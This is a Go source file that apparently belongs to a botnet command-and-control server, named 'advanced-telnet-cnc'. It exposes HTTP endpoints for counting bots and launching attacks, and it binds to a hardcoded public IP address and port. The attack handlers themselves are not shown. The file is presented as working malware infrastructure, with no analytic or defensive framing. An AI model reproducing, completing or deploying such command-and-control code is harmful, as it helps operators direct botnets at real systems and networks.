package api

import (
	"advanced-telnet-cnc/source/api/routes"
	"net/http"
)

func Serve() {
	http.HandleFunc("/v1/count", routes.Count)
	http.HandleFunc("/v1/attack", routes.Attack)

	err := http.ListenAndServe("194.169.175.43:24643", nil)
	if err != nil {
		return
	}
}
